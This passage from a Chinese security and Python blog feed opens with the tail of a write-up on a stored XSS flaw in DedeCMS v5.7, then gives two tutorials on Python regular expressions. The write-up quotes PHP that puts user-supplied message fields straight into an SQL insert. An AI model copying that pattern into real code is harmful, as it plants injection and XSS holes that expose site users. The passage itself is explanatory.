,name,contact,content,ip,adddate)"</span> . <span class="string">"VALUES (NULL, '$msgtitle', '$msgname', '$msgcontact','$msgcontent', '$userip', null)"</span>;</span><br><span class="line">    $result = $yiqi_db-&gt;query(CheckSql($sql));</span><br></pre></td></tr></table></figure></li></ul><h2 id="参考链接"><a href="#参考链接" class="headerlink" title="参考链接"></a>参考链接</h2><ul><li><a href="https://github.com/SecWiki/CMS-Hunter/tree/master/DedeCMS/DedeCMS_v5.7_carbuyaction_%E5%AD%98%E5%82%A8%E5%9E%8BXSS" target="_blank" rel="noopener">https://github.com/SecWiki/CMS-Hunter/tree/master/DedeCMS/DedeCMS_v5.7_carbuyaction_%E5%AD%98%E5%82%A8%E5%9E%8BXSS</a></li><li><a href="https://www.seebug.org/vuldb/ssvid-89295" target="_blank" rel="noopener">https://www.seebug.org/vuldb/ssvid-89295</a></li></ul>]]></content>
      
      
      <categories>
          
          <category> 网络安全 </category>
          
          <category> Web安全 </category>
          
      </categories>
      
      
        <tags>
            
            <tag> PHP </tag>
            
            <tag> XSS </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>【python-正则】1.2Python正则表达式学习-2</title>
      <link href="/2020/04/14/1.2%20Python%E6%AD%A3%E5%88%99%E8%A1%A8%E8%BE%BE%E5%BC%8F%E5%AD%A6%E4%B9%A0-2/"/>
      <url>/2020/04/14/1.2%20Python%E6%AD%A3%E5%88%99%E8%A1%A8%E8%BE%BE%E5%BC%8F%E5%AD%A6%E4%B9%A0-2/</url>
      
        <content type="html"><![CDATA[<p>本文主要是对Python正则相关知识，进行简单的梳理</p><a id="more"></a><h2 id="0x01-正则表达式语法"><a href="#0x01-正则表达式语法" class="headerlink" title="0x01 正则表达式语法"></a>0x01 正则表达式语法</h2><h3 id="1-1-字符与字符类"><a href="#1-1-字符与字符类" class="headerlink" title="1.1 字符与字符类"></a>1.1 字符与字符类</h3><p>1.特殊字符：<font color=    #FF0000 size =5>\.^$?+*{}[]()|</font></p><p>以上特殊字符要表示字面值，必须使用<font color=#FF0000>\</font>进行转义</p><p>2.字符类 </p><ul><li>包含在<font color=#FF0000 size=4>[]</font>中的一个或者多个字符被称为字符类，字符类在匹配时如果没有指定量词则只会匹配其中的一个。</li><li>字符类内可以指定范围，比如<font color=#FF0000 size=4>[a-zA-Z0-9]</font>表示a到z，A到Z，0到9之间的任何一个字符</li><li>左方括号后跟随一个<font color=#FF0000 size=4>^</font>，表示否定一个字符类，比如<font color=#FF0000 size=4>[^0-9]</font>表示可以匹配一个任意非数字的字符。</li><li>字符类内部，除了<font color=#FF0000 size=4>\</font>之外，其他特殊字符不再具备特殊意义，都表示字面值。<font color=#FF0000 size=4>^</font>放在第一个位置表示否定，放在其他位置表示<font color=#FF0000 size=4>^</font>本身，<font color=#FF0000 size=4>-</font>放在中间表示范围，放在字符类中的第一个字符，则表示<font color=#FF0000 size=4>-</font>本身。</li><li>字符类内部可以使用速记法，比如<font color=#FF0000 size=4>\d \s \w</font></li></ul><p>3.速记法</p><ul><li><font color=#FF0000 size=4>.</font> 可以匹配除换行符之外的任何字符，如果有re.DOTALL标志，则匹配任意字符包括换行</li><li><font color=#FF0000 size=4>\d</font>匹配一个Unicode数字，如果带re.ASCII，则匹配0-9</li><li><font color=#FF0000 size=4>\D</font>匹配Unicode非数字</li><li><font color=#FF0000 size=4>\s</font> 匹配Unicode空白，如果带有re.ASCII，则匹配<font color=#FF0000 size=4>\t\n\r\f\v</font>中的一个</li><li><font color=#FF0000 size=4>\S</font> 匹配Unicode非空白</li><li><font color=#FF0000 size=4>\w</font>匹配Unicode单词字符，如果带有re.ascii,则匹配<font color=#FF0000 size=4>[a-zA-Z0-9_]</font>中的一个</li><li><font color=#FF0000 size=4>\W</font>匹配Unicode非单词字符</li></ul><h3 id="1-2-量词"><a href="#1-2-量词" class="headerlink" title="1.2 量词"></a>1.2 量词</h3><ul><li><font color=#FF0000 size=4>?</font>  匹配前面的字符0次或1次</li><li><font color=#FF0000 size=4>*</font>  匹配前面的字符0次或多次</li><li><font color=#FF0000 size=4>+</font>  匹配前面的字符1次或者多次</li><li><font color=#FF0000 size=4>{m}</font> 匹配前面表达式m次</li><li><font color=#FF0000 size=4>{m,}</font>  匹配前面表达式至少m次</li><li><font color=#FF0000 size=4>{,n}</font> 匹配前面的正则表达式最多n次</li><li><font color=#FF0000 size=4>{m,n}</font> 匹配前面的正则表达式至少m次，最多n次</li></ul><p>注意点：<br>以上量词都是贪婪模式，会尽可能多的匹配，如果要改为非贪婪模式，通过在量词后面跟随一个<font color=#FF0000 size=4>?</font>来实现</p><h3 id="1-3-组与捕获"><a href="#1-3-组与捕获" class="headerlink" title="1.3 组与捕获"></a>1.3 组与捕获</h3><p>1.<font color=#FF0000 size=4>()</font>的作用</p><ul><li><p>捕获<font color=#FF0000 size=4>()</font>中正则表达式内容以备进一步利用处理，可以通过在左括号后面跟随<font color=#FF0000 size=4>?:</font>来关闭括号的捕获功能</p></li><li><p>将正则表达式的一部分内容进行组合，方便使用量词或者|</p></li></ul><p>2.反向引用前面<font color=#FF0000 size=4>()</font>内捕获的内容</p><ul><li><p>通过组号反向引用</p><p> 每一个没有使用<font color=#FF0000 size=4>?:</font>的小括号都会分配一个组好，从1开始，从左到右递增，可以通过<font color=#FF0000 size=4>\i</font>引用前面<font color=#FF0000 size=4>()</font>内表达式捕获的内容</p></li><li><p>通过组名反向引用前面小括号内捕获的内容</p><p>  可以通过在左括号后面跟随<code>?P&lt;name&gt;</code>,尖括号中放入组名来为一个组起一个别名，后面通过<code>(?P=name)</code>来引用 前面捕获的内容。如<code>(?P&lt;word&gt;\w+)\s+(?P=word)</code>来匹配重复的单词。</p></li></ul><p>注意点：<br>反向引用不能放在字符类<font color=#FF0000 size=4>[]</font>中使用</p><h3 id="1-4-断言与标记"><a href="#1-4-断言与标记" class="headerlink" title="1.4 断言与标记"></a>1.4 断言与标记</h3><p>断言不会匹配任何文本，只是对断言所在的文本施加某些约束</p><p>1.常用断言</p><ul><li><font color=#FF0000 size=4>\b</font> 匹配单词的边界，放在字符类[]中则表示backspace</li><li><font color=#FF0000 size=4>\B</font> 匹配非单词边界，受ASCII标记影响</li><li><font color=#FF0000 size=4>\A</font> 在起始处匹配</li><li><font color=#FF0000 size=4>^</font> 在起始处匹配，如果有MULTILINE标志，则在每个换行符后匹配</li><li><font color=#FF0000 size=4>\Z</font> 在结尾处匹配</li><li><font color=#FF0000 size=4>$</font>在结尾处匹配，如果有MULTILINE标志，则在每个换行符前匹配</li><li><font color=#FF0000 size=4>(?=e)</font> 正前瞻</li><li><font color=#FF0000 size=4>(?!e)</font> 负前瞻</li><li><font color=#FF0000 size=4>(?&lt;=e)</font> 正回顾</li><li><font color=#FF0000 size=4>(?&lt;!e)</font>负回顾</li></ul><p>2.前瞻回顾的解释</p><ul><li>前瞻： <font color=#FF0000 size=4>exp1(?=exp2)</font> exp1后面的内容要匹配exp2</li><li>负前瞻: <font color=#FF0000 size=4>exp1(?!exp2)</font> exp1后面的内容不能匹配exp2</li><li>后顾: <font color=#FF0000 size=4>(?&lt;=exp2)exp1</font> exp1前面的内容要匹配exp2</li><li>负后顾: <font color=#FF0000 size=4>(?&lt;!exp2)exp1</font> exp1前面的内容不能匹配exp2</li></ul><p>例如：我们要查找hello，但是hello后面必须是world，正则表达式可以这样写：”(hello)\s+(?=world)”,用来匹配”hello wangxing”和”hello world”只能匹配到后者的hello</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">import</span> re</span><br><span class="line">re.match(<span class="string">"(hello)\s+(?=world)"</span>,<span class="string">"hello world"</span>).group()</span><br></pre></td></tr></table></figure><pre><code>&apos;hello &apos;</code></pre><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">re.match(<span class="string">"(hello)\s+(?=world)"</span>,<span class="string">"hello dd"</span>).group()</span><br></pre></td></tr></table></figure><pre><code>---------------------------------------------------------------------------AttributeError                            Traceback (most recent call last)&lt;ipython-input-5-07f0304e6ee4&gt; in &lt;module&gt;----&gt; 1 re.match(&quot;(hello)\s+(?=world)&quot;,&quot;hello dd&quot;).group()AttributeError: &apos;NoneType&apos; object has no attribute &apos;group&apos;</code></pre><h3 id="1-5-条件匹配"><a href="#1-5-条件匹配" class="headerlink" title="1.5 条件匹配"></a>1.5 条件匹配</h3><p><font color=#FF0000 size=4>(?(id)yes_exp|no_exp)</font> 对应id的子表达式如果匹配到内容，则这里匹配yes_exp，否则匹配no_exp</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">re.match(<span class="string">r"(123)qwe(?(1)456|789)"</span>, <span class="string">"123qwe456"</span>).group()</span><br></pre></td></tr></table></figure><pre><code>&apos;123qwe456&apos;</code></pre><h3 id="1-6-正则表达式的标志"><a href="#1-6-正则表达式的标志" class="headerlink" title="1.6 正则表达式的标志"></a>1.6 正则表达式的标志</h3><ul><li><p>正则表达式的标志有两种使用方法</p><ul><li>通过给compile方法传入标志参数，多个标志使用|分割的方法,如<font color=#FF0000 size=4>re.compile(r”#[\da-f]{6}\b”, re.IGNORECASE|re.MULTILINE)</font></li><li>通过在正则表达式前面添加(?标志)的方法给正则表达式添加标志，如<font color=#FF0000 size=4>(?ms)#[\da-z]{6}\b</font></li></ul></li><li><p>常用的标志</p><ul><li>re.A或者re.ASCII， 使\b \B \s \S \w \W \d \D都假定字符串为假定字符串为ASCII</li><li>re.I或者re.IGNORECASE 使正则表达式忽略大小写</li><li>re.M或者re.MULTILINE 多行匹配，使每个^在每个回车后，每个$在每个回车前匹配</li><li>re.S或者re.DOTALL 使.能匹配任意字符，包括回车</li><li>re.X或者re.VERBOSE 这样可以在正则表达式跨越多行，也可以添加注释，但是空白需要使用\s,或者[ ]来表示，因为默认的空白不再解释。如：</li></ul></li></ul><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line">charref = re.compile(<span class="string">r"""</span></span><br><span class="line"><span class="string"> &amp;[#]                # Start of a numeric entity reference</span></span><br><span class="line"><span class="string"> (</span></span><br><span class="line"><span class="string">     0[0-7]+         # Octal form</span></span><br><span class="line"><span class="string">   | [0-9]+          # Decimal form</span></span><br><span class="line"><span class="string">   | x[0-9a-fA-F]+   # Hexadecimal form</span></span><br><span class="line"><span class="string"> )</span></span><br><span class="line"><span class="string"> ;                   # Trailing semicolon</span></span><br><span class="line"><span class="string">"""</span>, re.VERBOSE)</span><br></pre></td></tr></table></figure><h2 id="0x02-Python正则表达式模块"><a href="#0x02-Python正则表达式模块" class="headerlink" title="0x02 Python正则表达式模块"></a>0x02 Python正则表达式模块</h2><h3 id="2-1-正则表达式处理字符串主要四大功能"><a href="#2-1-正则表达式处理字符串主要四大功能" class="headerlink" title="2.1 正则表达式处理字符串主要四大功能"></a>2.1 正则表达式处理字符串主要四大功能</h3><ul><li>匹配：查看一个字符串是否符合正则表达式的语法，一般返回true或者false</li><li>获取： 正则表达式来提取字符串中符合要求的文本</li><li>替换 查找字符串中符合正则表达式的文本，并用相应的字符串替换</li><li>分割 使用正则表达式对字符串进行分割。</li></ul><h3 id="2-2-Python中re模块使用正则表达式的两种方法"><a href="#2-2-Python中re模块使用正则表达式的两种方法" class="headerlink" title="2.2 Python中re模块使用正则表达式的两种方法"></a>2.2 Python中re模块使用正则表达式的两种方法</h3><ul><li>使用re.compile(r, f)方法生成正则表达式对象，然后调用正则表达式对象的相应方法。这种做法的好处是生成正则对象之后可以多次使用。</li><li>re模块中对正则表达式对象的每个对象方法都有一个对应的模块方法，唯一不同的是传入的第一个参数是正则表达式字符串。此种方法适合于只使用一次的正则表达式。</li></ul><h3 id="2-3-正则表达式对象的常用方法"><a href="#2-3-正则表达式对象的常用方法" class="headerlink" title="2.3 正则表达式对象的常用方法"></a>2.3 正则表达式对象的常用方法</h3><ul><li><p><font color=#FF0000 size=4>rx.findall(s,start, end)</font></p><p>  返回一个列表，如果正则表达式中没有分组，则列表中包含的是所有匹配的内容，<br>如果正则表达式中有分组，则列表中的每个元素是一个元组，元组中包含子分组中匹配到的内容，但是没有返回整个正则表达式匹配的内容</p></li></ul><p>​    </p><ul><li><p><font color=#FF0000 size=4>rx.finditer(s, start, end)</font></p><p>  返回一个可迭代对象<br>对可迭代对象进行迭代，每一次返回一个匹配对象，可以调用匹配对象的group()方法查看指定组匹配到的内容，0表示整个正则表达式匹配到的内容</p></li><li><p><font color=#FF0000 size=4>rx.search(s, start, end)</font></p><p>  返回一个匹配对象,倘若没匹配到，就返回None</p><p>  search方法只匹配一次就停止，不会继续往后匹配</p></li><li><p><font color=#FF0000 size=4>rx.match(s, start, end)</font></p><p>  如果正则表达式在字符串的起始处匹配，就返回一个匹配对象，否则返回None</p></li><li><p><font color=#FF0000 size=4>rx.sub(x, s, m)</font></p><p>  返回一个字符串。每一个匹配的地方用x进行替换，返回替换后的字符串，如果指定m，则最多替换m次。对于x可以使用/i或者/g<id>id可以是组名或者编号来引用捕获到的内容。</p><p>  模块方法re.sub(r, x, s, m)中的x可以使用一个函数。此时我们就可以对捕获到的内容推过这个函数进行处理后再替换匹配到的文本。</p></li></ul><ul><li><p><font color=#FF0000 size=4>rx.subn(x, s, m)</font></p><p>  与re.sub()方法相同，区别在于返回的是二元组，其中一项是结果字符串，一项是做替换的个数。</p></li><li><p><font color=#FF0000 size=4>rx.split(s, m)</font></p><p>  分割字符串,返回一个列表，用正则表达式匹配到的内容对字符串进行分割<br>  如果正则表达式中存在分组，则把分组匹配到的内容放在列表中每两个分割的中间作为列表的一部分，如：</p></li></ul><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">rx = re.compile(<span class="string">r"(\d)[a-z]+(\d)"</span>)</span><br><span class="line">s = <span class="string">"ab12dk3klj8jk9jks5"</span></span><br><span class="line">result = rx.split(s)</span><br><span class="line">result</span><br></pre></td></tr></table></figure><pre><code>[&apos;ab1&apos;, &apos;2&apos;, &apos;3&apos;, &apos;klj&apos;, &apos;8&apos;, &apos;9&apos;, &apos;jks5&apos;]</code></pre><ul><li><p><font color=#FF0000 size=4>rx.flags()</font></p><p>  正则表达式编译时设置的标志</p></li><li><p><font color=#FF0000 size=4>rx.pattern()</font></p><p>  正则表达式编译时使用的字符串</p></li></ul><h3 id="2-4-匹配对象的属性与方法"><a href="#2-4-匹配对象的属性与方法" class="headerlink" title="2.4 匹配对象的属性与方法"></a>2.4 匹配对象的属性与方法</h3><ul><li><p><font color=#FF0000 size=4>m.group(g, …)</font></p><p>  返回编号或者组名匹配到的内容，默认或者0表示整个表达式匹配到的内容，如果指定多个，就返回一个元组</p></li><li><p><font color=#FF0000 size=4>m.groupdict(default)</font></p><p>  返回一个字典。字典的键是所有命名的组的组名，值为命名组捕获到的内容<br>  如果有default参数，则将其作为那些没有参与匹配的组的默认值。</p></li><li><p><font color=#FF0000 size=4>m.groups(default)</font></p><p>  返回一个元组。包含所有捕获到内容的子分组，从1开始，如果指定了default值，则这个值作为那些没有捕获到内容的组的值</p></li><li><p><font color=#FF0000 size=4>m.lastgroup()</font></p><p>  匹配到内容的编号最高的捕获组的名称，如果没有或者没有使用名称则返回None(不常用)</p></li><li><p><font color=#FF0000 size=4>m.lastindex()</font></p><p>  匹配到内容的编号最高的捕获组的编号，如果没有就返回None</p></li><li><p><font color=#FF0000 size=4>m.start(g)</font></p><p>  当前匹配对象的子分组是从字符串的那个位置开始匹配的,如果当前组没有参与匹配就返回-1</p></li><li><p><font color=#FF0000 size=4>m.end(g)</font></p><p>  当前匹配对象的子分组是从字符串的那个位置匹配结束的，如果当前组没有参与匹配就返回-1</p></li><li><p><font color=#FF0000 size=4>m.span()</font></p><p>  返回一个二元组，内容分别是m.start(g)和m.end(g)的返回值</p></li><li><p><font color=#FF0000 size=4>m.re()</font></p><p>  产生这一匹配对象的正则表达式</p></li><li><p><font color=#FF0000 size=4>m.string()</font></p><p>  传递给match或者search用于匹配的字符串</p></li><li><p><font color=#FF0000 size=4>m.pos()</font></p><p>  搜索的起始位置。即字符串的开头，或者start指定的位置(不常用)</p></li><li><p><font color=#FF0000 size=4>m.endpos()</font></p><p>  搜索的结束位置。即字符串的末尾位置，或者end指定的位置(不常用)</p></li></ul><h3 id="2-5-总结"><a href="#2-5-总结" class="headerlink" title="2.5 总结"></a>2.5 总结</h3><ul><li>对于正则表达式的匹配功能，Python没有返回true和false的方法，但可以通过对match或者search方法的返回值是否是None来判断</li><li>对于正则表达式的搜索功能，如果只搜索一次可以使用search或者match方法返回的匹配对象得到，对于搜索多次可以使用finditer方法返回的可迭代对象来迭代访问</li><li>对于正则表达式的替换功能，可以使用正则表达式对象的sub或者subn方法来实现，也可以通过re模块方法sub或者subn来实现，区别在于模块的sub方法的替换文本可以使用一个函数来生成</li><li>对于正则表达式的分割功能，可以使用正则表达式对象的split方法，需要注意如果正则表达式对象有分组的话，分组捕获的内容也会放到返回的列表中</li></ul><h2 id="参考链接"><a href="#参考链接" class="headerlink" title="参考链接"></a>参考链接</h2><ul><li>正则表达式HOWTO <a href="https://docs.python.org/zh-cn/3/howto/regex.html#regex-howto" target="_blank" rel="noopener">https://docs.python.org/zh-cn/3/howto/regex.html#regex-howto</a></li><li>re-模块操作 <a href="https://docs.python.org/zh-cn/3/library/re.html" target="_blank" rel="noopener">https://docs.python.org/zh-cn/3/library/re.html</a></li><li>小结参考：<a href="https://www.jianshu.com/p/5295c5988b7f" target="_blank" rel="noopener">https://www.jianshu.com/p/5295c5988b7f</a></li></ul>]]></content>
      
      
      <categories>
          
          <category> python </category>
          
          <category> Python基础 </category>
          
      </categories>
      
      
        <tags>
            
            <tag> python </tag>
            
            <tag> 正则表达式 </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>【python-正则】1.1Python正则表达式学习-1</title>
      <link href="/2020/04/13/1.1%20Python%E6%AD%A3%E5%88%99%E8%A1%A8%E8%BE%BE%E5%BC%8F%E5%AD%A6%E4%B9%A0-1/"/>
      <url>/2020/04/13/1.1%20Python%E6%AD%A3%E5%88%99%E8%A1%A8%E8%BE%BE%E5%BC%8F%E5%AD%A6%E4%B9%A0-1/</url>
      
        <content type="html"><![CDATA[<p>本文主要内容：正则表达式概述、re模块操作、表示字符、原始字符串、表示数量、表示边界、 匹配分组、re模块的高级用法、贪婪和非贪婪、小练习</p><a id="more"></a><h2 id="0x01-正则表达式概述"><a href="#0x01-正则表达式概述" class="headerlink" title="0x01 正则表达式概述"></a>0x01 正则表达式概述</h2><p>正则表达式，又称正规表示式、正规表示法、正规表达式、 规则表达式、 常规表示法（英语：Regular Expression，在代码中常简写为regex、 regexp或RE），是计算机科学的一个概念。正则表达式使用单个字符串来描述、 匹配一系列匹配某个句法规则的字符串。 在很多⽂本编辑器里，正则表达式通常被用来检索、替换那些匹配某个模式的文本。</p><p>Regular Expression的“Regular”⼀般被译为“正则”、 “正规”、 “常规”。 此处的“Regular”即是“规则”、 “规律”的意思， Regular Expression即“描述某种规则的表达式”之意。</p><h2 id="0x02-re模块操作"><a href="#0x02-re模块操作" class="headerlink" title="0x02 re模块操作"></a>0x02 re模块操作</h2><blockquote><p>在Python中需要通过正则表达式对字符串进⾏匹配的时候，可以使⽤⼀个模<br>块，名字为re</p></blockquote><h3 id="2-1-re模块的使用过程"><a href="#2-1-re模块的使用过程" class="headerlink" title="2.1 re模块的使用过程"></a>2.1 re模块的使用过程</h3><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment"># 导入re模块</span></span><br><span class="line"><span class="keyword">import</span> re</span><br><span class="line"></span><br><span class="line"><span class="comment"># 使用match方法进行匹配操作</span></span><br><span class="line">result = re.match(正则表达式，要匹配的字符串)</span><br><span class="line"></span><br><span class="line"><span class="comment"># 如果上⼀步匹配到数据的话， 可以使⽤group⽅法来提取数据</span></span><br><span class="line">result.group()</span><br></pre></td></tr></table></figure><ul><li><p>re.match是进行正则匹配检查的方法，若字符串匹配正则表达式，则match方法返回匹配对象（Match Object）,否则返回None（注意不是空字符串””）</p></li><li><p>匹配对象Match Object对象具有group方法，用来返回字符串的匹配部分</p></li></ul><h3 id="2-2-re模块示例"><a href="#2-2-re模块示例" class="headerlink" title="2.2 re模块示例"></a>2.2 re模块示例</h3><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">#匹配hello开头的字符串</span></span><br><span class="line"><span class="keyword">import</span> re</span><br><span class="line">result = re.match(<span class="string">"hello"</span>,<span class="string">"hello world"</span>)</span><br><span class="line"><span class="comment"># 查看Match  object对象</span></span><br><span class="line">result</span><br></pre></td></tr></table></figure><pre><code>Out:&lt;re.Match object; span=(0, 5), match=&apos;hello&apos;&gt;</code></pre><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">result.group()</span><br></pre></td></tr></table></figure><pre><code>Out:&apos;hello&apos;</code></pre><h2 id="0x03-表示字符"><a href="#0x03-表示字符" class="headerlink" title="0x03 表示字符"></a>0x03 表示字符</h2><p>正则表达式单字符匹配常用的模式</p><table><thead><tr><th align="center">字符</th><th align="left">功能</th></tr></thead><tbody><tr><td align="center">.</td><td align="left">匹配任意1个字符（除了\n）</td></tr><tr><td align="center">[]</td><td align="left">匹配[]中列举的字符</td></tr><tr><td align="center">\d</td><td align="left">匹配数字，即0-9</td></tr><tr><td align="center">\D</td><td align="left">匹配非数字，即不是数字</td></tr><tr><td align="center">\s</td><td align="left">匹配空白，即空格、tab键</td></tr><tr><td align="center">\S</td><td align="left">匹配非空白</td></tr><tr><td align="center">\w</td><td align="left">匹配单词字符，即a-z、A-Z、0-9、_</td></tr><tr><td align="center">\W</td><td align="left">匹配非单词字符</td></tr></tbody></table><h3 id="3-1-示例1："><a href="#3-1-示例1：" class="headerlink" title="3.1 示例1：."></a>3.1 示例1：.</h3><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">import</span> re</span><br><span class="line">ret1 = re.match(<span class="string">"."</span>,<span class="string">"a"</span>)</span><br><span class="line"></span><br><span class="line">ret1.group()</span><br></pre></td></tr></table></figure><pre><code>Out:&apos;a&apos;</code></pre><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">ret2 = re.match(<span class="string">"."</span>,<span class="string">"bca"</span>)</span><br><span class="line">ret2.group()</span><br></pre></td></tr></table></figure><pre><code>Out:&apos;b&apos;</code></pre><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">ret3 = re.match(<span class="string">"."</span>,<span class="string">"@18"</span>)</span><br><span class="line">ret3.group()</span><br></pre></td></tr></table></figure><pre><code>Out:&apos;@&apos;</code></pre><h3 id="3-2-示例2："><a href="#3-2-示例2：" class="headerlink" title="3.2 示例2：[]"></a>3.2 示例2：[]</h3><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment"># 如果hello的首字符⼩写， 那么正则表达式需要⼩写的h</span></span><br><span class="line">ret1 = re.match(<span class="string">"h"</span>,<span class="string">"hello Python"</span>)</span><br><span class="line">ret1.group()</span><br></pre></td></tr></table></figure><pre><code>Out:&apos;h&apos;</code></pre><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment"># 如果hello的首字符大写，则正则表达式则需要大写的H</span></span><br><span class="line">ret2 = re.match(<span class="string">"H"</span>,<span class="string">"Hello Python"</span>)</span><br><span class="line">ret2.group()</span><br></pre></td></tr></table></figure><pre><code>Out:&apos;H&apos;</code></pre><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment"># 大小写都可以</span></span><br><span class="line">ret3 = re.match(<span class="string">"[hH]"</span>,<span class="string">"hello Python"</span>)</span><br><span class="line">ret3.group()</span><br></pre></td></tr></table></figure><pre><code>Out:&apos;h&apos;</code></pre><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">ret4 = re.match(<span class="string">"[hH]"</span>,<span class="string">"Hello Python"</span>)</span><br><span class="line">ret4.group()</span><br></pre></td></tr></table></figure><pre><code>Out:&apos;H&apos;</code></pre><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment"># 匹配0-9第一种写法</span></span><br><span class="line">ret5 = re.match(<span class="string">"[0123456789]"</span>,<span class="string">"7Hello"</span>)</span><br><span class="line">ret5.group()</span><br></pre></td></tr></table></figure><pre><code>Out:&apos;7&apos;</code></pre><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment"># 匹配0-9第二种写法</span></span><br><span class="line">ret6= re.match(<span class="string">"[0-9]"</span>,<span class="string">"7Hello"</span>)</span><br><span class="line">ret6.group()</span><br></pre></td></tr></table></figure><pre><code>Out:&apos;7&apos;</code></pre><h3 id="3-3-示例3：-d"><a href="#3-3-示例3：-d" class="headerlink" title="3.3 示例3：\d"></a>3.3 示例3：\d</h3><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment"># 普通匹配</span></span><br><span class="line">ret1 = re.match(<span class="string">"hello2"</span>,<span class="string">"hello2world"</span>)</span><br><span class="line">ret1.group()</span><br></pre></td></tr></table></figure><pre><code>Out:&apos;hello2&apos;</code></pre><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment"># 使用\d匹配</span></span><br><span class="line">ret2 = re.match(<span class="string">"hello\d"</span>,<span class="string">"hello2world"</span>)</span><br><span class="line">ret2.group()</span><br></pre></td></tr></table></figure><pre><code>Out:&apos;hello2&apos;</code></pre><h2 id="0x04-原始字符串"><a href="#0x04-原始字符串" class="headerlink" title="0x04 原始字符串"></a>0x04 原始字符串</h2><h3 id="4-1-各种示例"><a href="#4-1-各种示例" class="headerlink" title="4. 1 各种示例"></a>4. 1 各种示例</h3><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment"># 比如：想打印出\n,一个反斜杠时，当作换行符进行打印</span></span><br><span class="line">s= <span class="string">"\ndd"</span></span><br><span class="line">print(s)</span><br></pre></td></tr></table></figure><pre><code>打印：dd</code></pre><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">s= <span class="string">"\\ndd"</span></span><br><span class="line">print(s)</span><br></pre></td></tr></table></figure><pre><code>打印：\ndd</code></pre><ul><li>mm = “c:\a\b\c”</li></ul><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">mm= <span class="string">"c:\\a\\b\\c"</span></span><br><span class="line">mm</span><br></pre></td></tr></table></figure><pre><code>Out:&apos;c:\\a\\b\\c&apos;</code></pre><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">print(mm)</span><br></pre></td></tr></table></figure><pre><code>打印：c:\a\b\c</code></pre><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment"># 这里匹配需四个反斜杠，方能匹配字符串中两个反斜杠</span></span><br><span class="line">re.match(<span class="string">"c:\\\\"</span>,mm).group()</span><br></pre></td></tr></table></figure><pre><code>Out:&apos;c:\\&apos;</code></pre><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">ret = re.match(<span class="string">"c:\\\\a"</span>,mm).group()</span><br><span class="line">print(ret)</span><br></pre></td></tr></table></figure><pre><code>打印：c:\a</code></pre><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment"># 使用r</span></span><br><span class="line">ret =re.match(<span class="string">r"c:\\a"</span>,mm).group()</span><br><span class="line">print(ret)</span><br></pre></td></tr></table></figure><pre><code>打印：c:\a</code></pre><figure class="highlight python"><table><tr><td class="gutter"><pre><span 